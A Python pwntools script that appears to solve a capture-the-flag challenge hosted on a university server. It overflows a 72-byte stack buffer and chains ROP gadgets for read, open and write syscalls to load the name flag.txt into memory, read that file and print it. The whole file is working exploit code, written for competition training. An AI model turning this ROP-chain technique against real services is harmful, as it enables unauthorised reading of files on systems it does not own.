from pwn import *

context.terminal = ["konsole", "-e"]

breakpoint = "0x0000000000401191"

r = remote("cyberchallenge.disi.unitn.it", 9202)
#r = remote("localhost", 5000)
#r = process("./bin")
# r = gdb.debug(
#     "./bin",
#     f"""
#     break *{breakpoint}
#     continue
#     """
# )

filename = b"flag.txt\x00"

# 0x0000000000401196: pop rdi; ret; 
# 0x000000000040119a: pop rdx; ret; 
# 0x0000000000401198: pop rsi; ret;
# 0x000000000040119c: mov rax, 0; syscall; ret; 
# 0x00000000004011a6: mov rax, 1; syscall; ret;
# 0x00000000004011b0: mov rax, 2; syscall; ret;

pop_rdi = p64(0x0000000000401196)
pop_rdx = p64(0x000000000040119a)
pop_rsi = p64(0x0000000000401198)
syscall_read = p64(0x000000000040119c)
syscall_write = p64(0x00000000004011a6)
syscall_open = p64(0x00000000004011b0)

writable_memory = p64(0x0000000000404020)
file_descriptor = p64(6)

offset = 72

payload = b"A" * offset

# put filename in memory
payload += pop_rdi
payload += p64(0) # stdin
payload += pop_rsi
payload += writable_memory # bss section
payload += pop_rdx
payload += p64(len(filename))
payload += syscall_read

# open file
payload += pop_rdi
payload += writable_memory
payload += pop_rsi
payload += p64(0)
payload += pop_rdx
payload += p64(0)
payload += syscall_open

# read file
payload += pop_rdi
payload += file_descriptor # file descriptor
payload += pop_rsi
payload += writable_memory
payload += pop_rdx
payload += p64(100)
payload += syscall_read

# print file
payload += pop_rdi
payload += p64(1) # stdout
payload += pop_rsi
payload += writable_memory
payload += pop_rdx
payload += p64(100)
payload += syscall_write

# with open("/tmp/payload", "wb") as f:
#     f.write(payload + b"\n")
#     f.write(filename + b"\n")

r.sendline(payload)
r.sendline(filename)
# r.interactive()
print(r.recvall(timeout=1).decode(errors="ignore").split("\n")[0])